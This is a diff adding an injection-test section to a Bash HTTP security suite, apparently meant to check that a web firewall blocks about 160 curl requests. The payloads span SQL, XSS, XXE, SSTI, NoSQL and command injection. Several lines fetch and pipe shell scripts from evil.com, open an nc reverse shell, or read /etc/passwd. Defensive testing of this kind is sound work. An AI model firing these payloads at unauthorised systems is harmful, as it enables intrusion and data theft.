@@ -1,12 +1,12 @@
 #!/bin/bash
 #==============================================================================
 # HTTP Header Security Testing Suite - EXPANDED VERSION
-# Versão: 3.2.0
+# Versão: 3.3.0
 # Descrição: Script abrangente para testes de segurança de cabeçalhos HTTP
 #==============================================================================
 
 set -uo pipefail
-VERSION="3.2.0"
+VERSION="3.3.0"
 
 # Cores
 RED='\033[0;31m'
@@ -885,6 +885,218 @@ test_ssrf_attacks() {
 }
 
 #==============================================================================
+# INJECTION VULNERABILITIES - COMPREHENSIVE TESTS (160+ testes)
+#==============================================================================
+test_injection_vulnerabilities() {
+    print_section "💉 TESTES DE INJECTION VULNERABILITIES (160+ testes)"
+    
+    # -------------------------------------------------------------------------
+    # 1. SQL INJECTION (SQLi)
+    # -------------------------------------------------------------------------
+    print_subsection "1. SQL Injection (SQLi)"
+    test_curl "SQLi: ' OR '1'='1" "block" -A "$UA" -Lk "${URL}?id=' OR '1'='1"
+    test_curl "SQLi: ' OR 1=1--" "block" -A "$UA" -Lk "${URL}?id=' OR 1=1--"
+    test_curl "SQLi: \" OR \"\"=\"" "block" -A "$UA" -Lk "${URL}?id=\" OR \"\"=\""
+    test_curl "SQLi: 1' AND '1'='1" "block" -A "$UA" -Lk "${URL}?id=1' AND '1'='1"
+    test_curl "SQLi: UNION SELECT" "block" -A "$UA" -Lk "${URL}?id=1 UNION SELECT 1,2,3--"
+    test_curl "SQLi: UNION ALL SELECT" "block" -A "$UA" -Lk "${URL}?id=1 UNION ALL SELECT null,null,null--"
+    test_curl "SQLi: ORDER BY" "block" -A "$UA" -Lk "${URL}?id=1 ORDER BY 10--"
+    test_curl "SQLi: GROUP BY" "block" -A "$UA" -Lk "${URL}?id=1 GROUP BY 1--"
+    test_curl "SQLi: HAVING" "block" -A "$UA" -Lk "${URL}?id=1 HAVING 1=1--"
+    test_curl "SQLi: INSERT INTO" "block" -A "$UA" -Lk "${URL}?id=1'; INSERT INTO users VALUES('hacker')--"
+    
+    # -------------------------------------------------------------------------
+    # 2. CROSS-SITE SCRIPTING (XSS)
+    # -------------------------------------------------------------------------
+    print_subsection "2. Cross-Site Scripting (XSS)"
+    test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>alert(1)</script>"
+    test_curl "XSS: <img onerror>" "block" -A "$UA" -Lk "${URL}?q=<img src=x onerror=alert(1)>"
+    test_curl "XSS: <svg onload>" "block" -A "$UA" -Lk "${URL}?q=<svg onload=alert(1)>"
+    test_curl "XSS: <body onload>" "block" -A "$UA" -Lk "${URL}?q=<body onload=alert(1)>"
+    test_curl "XSS: javascript:" "block" -A "$UA" -Lk "${URL}?url=javascript:alert(1)"
+    test_curl "XSS: <iframe src>" "block" -A "$UA" -Lk "${URL}?q=<iframe src=javascript:alert(1)>"
+    test_curl "XSS: <input onfocus>" "block" -A "$UA" -Lk "${URL}?q=<input onfocus=alert(1) autofocus>"
+    test_curl "XSS: <a href=javascript>" "block" -A "$UA" -Lk "${URL}?q=<a href=javascript:alert(1)>click</a>"
+    test_curl "XSS: <div onmouseover>" "block" -A "$UA" -Lk "${URL}?q=<div onmouseover=alert(1)>hover</div>"
+    test_curl "XSS: eval()" "block" -A "$UA" -Lk "${URL}?q=<script>eval('ale'+'rt(1)')</script>"
+    
+    # -------------------------------------------------------------------------
+    # 3. CROSS-SITE REQUEST FORGERY (CSRF) Detection
+    # -------------------------------------------------------------------------
+    print_subsection "3. Cross-Site Request Forgery (CSRF)"
+    test_curl "CSRF: POST sem Referer" "block" -A "$UA" -Lk -X POST -d "action=delete&id=1" "$URL"
+    test_curl "CSRF: POST com Referer externo" "block" -A "$UA" -Lk -X POST -e "http://evil.com" -d "action=delete&id=1" "$URL"
+    test_curl "CSRF: POST sem Origin" "block" -A "$UA" -Lk -X POST -d "action=transfer&amount=1000" "$URL"
+    test_curl "CSRF: POST com Origin externo" "block" -A "$UA" -Lk -X POST -H "Origin: http://evil.com" -d "action=transfer" "$URL"
+    test_curl "CSRF: Forged token" "block" -A "$UA" -Lk -X POST -d "csrf_token=fake123&action=delete" "$URL"
+    
+    # -------------------------------------------------------------------------
+    # 4. REMOTE CODE EXECUTION (RCE)
+    # -------------------------------------------------------------------------
+    print_subsection "4. Remote Code Execution (RCE)"
+    test_curl "RCE: PHP system()" "block" -A "$UA" -Lk "${URL}?cmd=<?php system('id'); ?>"
+    test_curl "RCE: PHP exec()" "block" -A "$UA" -Lk "${URL}?cmd=<?php exec('whoami'); ?>"
+    test_curl "RCE: PHP passthru()" "block" -A "$UA" -Lk "${URL}?cmd=<?php passthru('cat /etc/passwd'); ?>"
+    test_curl "RCE: PHP shell_exec()" "block" -A "$UA" -Lk "${URL}?cmd=<?php shell_exec('ls -la'); ?>"
+    test_curl "RCE: PHP eval()" "block" -A "$UA" -Lk "${URL}?code=<?php eval(\$_GET['c']); ?>"
+    test_curl "RCE: PHP assert()" "block" -A "$UA" -Lk "${URL}?code=<?php assert('system(\"id\")'); ?>"
+    test_curl "RCE: PHP backticks" "block" -A "$UA" -Lk "${URL}?cmd=<?php echo \`id\`; ?>"
+    test_curl "RCE: PHP popen()" "block" -A "$UA" -Lk "${URL}?cmd=<?php popen('id','r'); ?>"
+    test_curl "RCE: PHP proc_open()" "block" -A "$UA" -Lk "${URL}?cmd=<?php proc_open('id',array(),''); ?>"
+    test_curl "RCE: Python os.system" "block" -A "$UA" -Lk "${URL}?cmd=import os;os.system('id')"
+    
+    # -------------------------------------------------------------------------
+    # 5. COMMAND INJECTION
+    # -------------------------------------------------------------------------
+    print_subsection "5. Command Injection"
+    test_curl "CMDi: ; id" "block" -A "$UA" -Lk "${URL}?cmd=;id"
+    test_curl "CMDi: | id" "block" -A "$UA" -Lk "${URL}?cmd=|id"
+    test_curl "CMDi: || id" "block" -A "$UA" -Lk "${URL}?cmd=||id"
+    test_curl "CMDi: && id" "block" -A "$UA" -Lk "${URL}?cmd=\`id\`"
+    test_curl "CMDi: \$(id)" "block" -A "$UA" -Lk "${URL}?cmd=\$(id)"
+    test_curl "CMDi: \`id\`" "block" -A "$UA" -Lk "${URL}?cmd=\`id\`"
+    test_curl "CMDi: newline" "block" -A "$UA" -Lk "${URL}?cmd=test%0aid"
+    test_curl "CMDi: carriage return" "block" -A "$UA" -Lk "${URL}?cmd=test%0did"
+    test_curl "CMDi: cat /etc/passwd" "block" -A "$UA" -Lk "${URL}?file=;cat /etc/passwd"
+    test_curl "CMDi: curl payload" "block" -A "$UA" -Lk "${URL}?url=;curl http://evil.com/shell.sh|sh"
+    
+    # -------------------------------------------------------------------------
+    # 6. XML INJECTION
+    # -------------------------------------------------------------------------
+    print_subsection "6. XML Injection"
+    test_curl "XMLi: Basic entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>' "$URL"
+    test_curl "XMLi: File disclosure" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$URL"
+    test_curl "XMLi: SSRF via DTD" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo></foo>' "$URL"
+    test_curl "XMLi: Parameter entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>' "$URL"
+    test_curl "XMLi: Billion laughs" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>' "$URL"
+    test_curl "XMLi: PHP expect" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>' "$URL"
+
+    # -------------------------------------------------------------------------
+    # 7. XPATH INJECTION
+    # -------------------------------------------------------------------------
+    print_subsection "7. XPath Injection"
+    test_curl "XPath: ' or '1'='1" "block" -A "$UA" -Lk "${URL}?user=' or '1'='1"
+    test_curl "XPath: ' or ''='" "block" -A "$UA" -Lk "${URL}?user=' or ''='"
+    test_curl "XPath: '] | //*['" "block" -A "$UA" -Lk "${URL}?user='] | //*['"
+    test_curl "XPath: //*" "block" -A "$UA" -Lk "${URL}?xpath=//*"
+    test_curl "XPath: //user[1]" "block" -A "$UA" -Lk "${URL}?xpath=//user[1]"
+    test_curl "XPath: count(//*)" "block" -A "$UA" -Lk "${URL}?xpath=count(//*)"
+    test_curl "XPath: string-length" "block" -A "$UA" -Lk "${URL}?xpath=string-length(//password)"
+    test_curl "XPath: substring" "block" -A "$UA" -Lk "${URL}?xpath=substring(//password,1,1)"
+    
+    # -------------------------------------------------------------------------
+    # 8. HTML INJECTION
+    # -------------------------------------------------------------------------
+    print_subsection "8. HTML Injection"
+    test_curl "HTMLi: <h1>injected</h1>" "block" -A "$UA" -Lk "${URL}?name=<h1>injected</h1>"
+    test_curl "HTMLi: <form action>" "block" -A "$UA" -Lk "${URL}?name=<form action=http://evil.com><input name=password></form>"
+    test_curl "HTMLi: <meta redirect>" "block" -A "$UA" -Lk "${URL}?name=<meta http-equiv=refresh content=0;url=http://evil.com>"
+    test_curl "HTMLi: <base href>" "block" -A "$UA" -Lk "${URL}?name=<base href=http://evil.com/>"
+    test_curl "HTMLi: <link rel>" "block" -A "$UA" -Lk "${URL}?name=<link rel=stylesheet href=http://evil.com/evil.css>"
+    test_curl "HTMLi: <style>" "block" -A "$UA" -Lk "${URL}?name=<style>body{background:url(http://evil.com)}</style>"
+    test_curl "HTMLi: <marquee>" "block" -A "$UA" -Lk "${URL}?name=<marquee onstart=alert(1)>test</marquee>"
+    test_curl "HTMLi: <object data>" "block" -A "$UA" -Lk "${URL}?name=<object data=javascript:alert(1)>"
+    
+    # -------------------------------------------------------------------------
+    # 9. SERVER-SIDE INCLUDES (SSI) INJECTION
+    # -------------------------------------------------------------------------
+    print_subsection "9. Server-Side Includes (SSI) Injection"
+    test_curl "SSI: <!--#exec cmd" "block" -A "$UA" -Lk "${URL}?page=<!--#exec cmd=\"id\"-->"
+    test_curl "SSI: <!--#include" "block" -A "$UA" -Lk "${URL}?page=<!--#include virtual=\"/etc/passwd\"-->"
+    test_curl "SSI: <!--#echo var" "block" -A "$UA" -Lk "${URL}?page=<!--#echo var=\"DOCUMENT_ROOT\"-->"
+    test_curl "SSI: <!--#config" "block" -A "$UA" -Lk "${URL}?page=<!--#config timefmt=\"%D\"-->"
+    test_curl "SSI: <!--#set var" "block" -A "$UA" -Lk "${URL}?page=<!--#set var=\"x\" value=\"test\"-->"
+    test_curl "SSI: <!--#printenv" "block" -A "$UA" -Lk "${URL}?page=<!--#printenv-->"
+    test_curl "SSI: <!--#fsize" "block" -A "$UA" -Lk "${URL}?page=<!--#fsize file=\"/etc/passwd\"-->"
+    
+    # -------------------------------------------------------------------------
+    # 10. OS COMMAND INJECTION (Extended)
+    # -------------------------------------------------------------------------
+    print_subsection "10. OS Command Injection (Extended)"
+    test_curl "OSi: /bin/bash -c" "block" -A "$UA" -Lk "${URL}?cmd=/bin/bash -c 'id'"
+    test_curl "OSi: /bin/sh -c" "block" -A "$UA" -Lk "${URL}?cmd=/bin/sh -c 'whoami'"
+    test_curl "OSi: nc -e" "block" -A "$UA" -Lk "${URL}?cmd=nc -e /bin/sh evil.com 4444"
+    test_curl "OSi: wget | sh" "block" -A "$UA" -Lk "${URL}?cmd=wget http://evil.com/shell.sh -O- | sh"
+    test_curl "OSi: curl | bash" "block" -A "$UA" -Lk "${URL}?cmd=curl http://evil.com/shell.sh | bash"
+    test_curl "OSi: python reverse" "block" -A "$UA" -Lk "${URL}?cmd=python -c 'import socket,subprocess,os'"
+    test_curl "OSi: perl reverse" "block" -A "$UA" -Lk "${URL}?cmd=perl -e 'use Socket'"
+    test_curl "OSi: ruby reverse" "block" -A "$UA" -Lk "${URL}?cmd=ruby -rsocket -e'f=TCPSocket'"
+    test_curl "OSi: php reverse" "block" -A "$UA" -Lk "${URL}?cmd=php -r '\$sock=fsockopen'"
+    test_curl "OSi: base64 decode" "block" -A "$UA" -Lk "${URL}?cmd=echo aWQ= | base64 -d | sh"
+    
+    # -------------------------------------------------------------------------
+    # 11. BLIND SQL INJECTION
+    # -------------------------------------------------------------------------
+    print_subsection "11. Blind SQL Injection"
+    test_curl "BlindSQLi: SLEEP(5)" "block" -A "$UA" -Lk "${URL}?id=1' AND SLEEP(5)--"
+    test_curl "BlindSQLi: BENCHMARK" "block" -A "$UA" -Lk "${URL}?id=1' AND BENCHMARK(10000000,MD5('test'))--"
+    test_curl "BlindSQLi: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1'; WAITFOR DELAY '0:0:5'--"
+    test_curl "BlindSQLi: pg_sleep" "block" -A "$UA" -Lk "${URL}?id=1'; SELECT pg_sleep(5)--"
+    test_curl "BlindSQLi: IF()" "block" -A "$UA" -Lk "${URL}?id=1' AND IF(1=1,SLEEP(5),0)--"
+    test_curl "BlindSQLi: CASE WHEN" "block" -A "$UA" -Lk "${URL}?id=1' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--"
+    test_curl "BlindSQLi: AND 1=1" "block" -A "$UA" -Lk "${URL}?id=1' AND 1=1--"
+    test_curl "BlindSQLi: AND 1=2" "block" -A "$UA" -Lk "${URL}?id=1' AND 1=2--"
+    test_curl "BlindSQLi: substring" "block" -A "$UA" -Lk "${URL}?id=1' AND SUBSTRING(@@version,1,1)='5'--"
+    test_curl "BlindSQLi: ASCII" "block" -A "$UA" -Lk "${URL}?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"
+    
+    # -------------------------------------------------------------------------
+    # 12. SERVER-SIDE TEMPLATE INJECTION (SSTI)
+    # -------------------------------------------------------------------------
+    print_subsection "12. Server-Side Template Injection (SSTI)"
+    test_curl "SSTI: {{7*7}}" "block" -A "$UA" -Lk "${URL}?name={{7*7}}"
+    test_curl "SSTI: {{config}}" "block" -A "$UA" -Lk "${URL}?name={{config}}"
+    test_curl "SSTI: {{self}}" "block" -A "$UA" -Lk "${URL}?name={{self.__class__}}"
+    test_curl "SSTI: Jinja2 RCE" "block" -A "$UA" -Lk "${URL}?name={{''.__class__.__mro__[2].__subclasses__()}}"
+    test_curl "SSTI: Twig" "block" -A "$UA" -Lk "${URL}?name={{_self.env.registerUndefinedFilterCallback('exec')}}"
+    test_curl "SSTI: FreeMarker" "block" -A "$UA" -Lk "${URL}?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"
+    test_curl "SSTI: Velocity" "block" -A "$UA" -Lk "${URL}?name=#set(\$str=\$class.inspect(\"java.lang.String\"))"
+    test_curl "SSTI: Smarty" "block" -A "$UA" -Lk "${URL}?name={php}echo system('id');{/php}"
+    test_curl "SSTI: Mako" "block" -A "$UA" -Lk "${URL}?name=<%import os;os.popen('id').read()%>"
+    test_curl "SSTI: ERB" "block" -A "$UA" -Lk "${URL}?name=<%=system('id')%>"
+    
+    # -------------------------------------------------------------------------
+    # 13. CRLF INJECTION
+    # -------------------------------------------------------------------------
+    print_subsection "13. CRLF Injection"
+    test_curl "CRLF: %0d%0a" "block" -A "$UA" -Lk "${URL}?url=http://example.com%0d%0aSet-Cookie:hacked=true"
+    test_curl "CRLF: %0a" "block" -A "$UA" -Lk "${URL}?url=http://example.com%0aX-Injected:true"
+    test_curl "CRLF: %0d" "block" -A "$UA" -Lk "${URL}?url=http://example.com%0dX-Injected:true"
+    test_curl "CRLF: \\r\\n" "block" -A "$UA" -Lk -H $'X-Custom: test\r\nX-Injected: true' "$URL"
+    test_curl "CRLF: Header Set-Cookie" "block" -A "$UA" -Lk -H $'X-Foo: bar\r\nSet-Cookie: admin=true' "$URL"
+    test_curl "CRLF: Header Location" "block" -A "$UA" -Lk -H $'X-Foo: bar\r\nLocation: http://evil.com' "$URL"
+    test_curl "CRLF: Double CRLF" "block" -A "$UA" -Lk "${URL}?url=http://example.com%0d%0a%0d%0a<html>injected</html>"
+    test_curl "CRLF: Unicode" "block" -A "$UA" -Lk "${URL}?url=http://example.com%E5%98%8D%E5%98%8ASet-Cookie:hacked=true"
+    
+    # -------------------------------------------------------------------------
+    # 14. NOSQL INJECTION
+    # -------------------------------------------------------------------------
+    print_subsection "14. NoSQL Injection"
+    test_curl "NoSQLi: \$ne" "block" -A "$UA" -Lk "${URL}?user[\$ne]=admin"
+    test_curl "NoSQLi: \$gt" "block" -A "$UA" -Lk "${URL}?user[\$gt]="
+    test_curl "NoSQLi: \$regex" "block" -A "$UA" -Lk "${URL}?user[\$regex]=.*"
+    test_curl "NoSQLi: \$where" "block" -A "$UA" -Lk "${URL}?user[\$where]=1"
+    test_curl "NoSQLi: \$exists" "block" -A "$UA" -Lk "${URL}?password[\$exists]=true"
+    test_curl "NoSQLi: JSON \$ne" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"user":{"$ne":""},"pass":{"$ne":""}}' "$URL"
+    test_curl "NoSQLi: JSON \$gt" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"user":"admin","pass":{"$gt":""}}' "$URL"
+    test_curl "NoSQLi: JSON \$regex" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"user":{"$regex":"^admin"}}' "$URL"
+    test_curl "NoSQLi: \$or bypass" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"$or":[{"user":"admin"},{"user":"guest"}]}' "$URL"
+    test_curl "NoSQLi: \$nin" "block" -A "$UA" -Lk "${URL}?role[\$nin][]=user"
+    
+    # -------------------------------------------------------------------------
+    # 15. HQL INJECTION (Hibernate Query Language)
+    # -------------------------------------------------------------------------
+    print_subsection "15. HQL Injection"
+    test_curl "HQL: OR 1=1" "block" -A "$UA" -Lk "${URL}?name=' OR '1'='1"
+    test_curl "HQL: UNION" "block" -A "$UA" -Lk "${URL}?name=' UNION SELECT password FROM User--"
+    test_curl "HQL: FROM User" "block" -A "$UA" -Lk "${URL}?query=FROM User WHERE id=1"
+    test_curl "HQL: SELECT *" "block" -A "$UA" -Lk "${URL}?query=SELECT * FROM User"
+    test_curl "HQL: DELETE" "block" -A "$UA" -Lk "${URL}?query=DELETE FROM User WHERE id=1"
+    test_curl "HQL: UPDATE" "block" -A "$UA" -Lk "${URL}?query=UPDATE User SET admin=true"
+    test_curl "HQL: ORDER BY sleep" "block" -A "$UA" -Lk "${URL}?order=' AND SLEEP(5)--"
+    test_curl "HQL: subquery" "block" -A "$UA" -Lk "${URL}?id=(SELECT id FROM User WHERE admin=true)"
+}
+
+#==============================================================================
 # PATH/URL BYPASS TECHNIQUES (40+ testes)
 #==============================================================================
 test_path_bypass() {
@@ -1117,6 +1329,7 @@ case $CATEGORY in
     database|db) test_database_attacks ;;
     ssrf) test_ssrf_attacks ;;
     pathbypass|bypass) test_path_bypass ;;
+    injection|injections) test_injection_vulnerabilities ;;
     all)
         test_all_http_methods
         test_malicious_cookies
@@ -1133,6 +1346,7 @@ case $CATEGORY in
         test_php_attacks
         test_database_attacks
         test_ssrf_attacks
+        test_injection_vulnerabilities
         test_path_bypass
         test_bad_user_agents
         test_bad_referers
